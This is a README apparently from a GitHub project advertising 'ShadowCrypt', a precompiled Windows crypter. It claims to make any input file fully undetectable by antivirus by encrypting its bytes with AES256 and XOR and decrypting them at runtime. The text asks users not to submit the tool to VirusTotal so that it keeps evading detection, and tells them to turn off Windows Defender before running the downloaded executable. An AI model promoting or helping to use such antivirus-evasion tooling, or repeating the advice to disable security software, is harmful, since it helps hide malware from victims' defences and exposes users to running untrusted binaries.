**Description**
----
ShadowCrypt is designed to be a fully undetectable (FUD) crypter that bypasses all antivirus software. I regularly update the stub to ensure it remains FUD, and in return for my effort, I kindly ask that you do not upload it to VirusTotal. Let's work together to maintain the only FUD crypter on GitHub.

Originally developed for personal use, I've simplified ShadowCrypt to make it accessible to everyone. It's easy to use and comes pre-compiled. While primarily designed for Windows, I plan to release the source code and make modifications for Linux users (note: it currently doesn't work with Wine).

**Usage/Install**
----
**You may need to turn off your windows Defender!**
1. **Download**: [Click here to download ShadowCrypt]
2. **Extract the zip file**
3. **Run** ShadowCrypt.exe.
4. **Set the input** (the path to the file you want to make undetectable) and **output** (the directory where the FUD file will be generated).
5. Click the "**CRYPT NOW**" button. The process may take a few minutes.
Enjoy your fully undetectable crypted file!

**How it Works**
----
ShadowCrypt uses advanced AES256 and XOR encryption to obfuscate your file's bytes, encrypting them in memory and decrypting them at runtime.
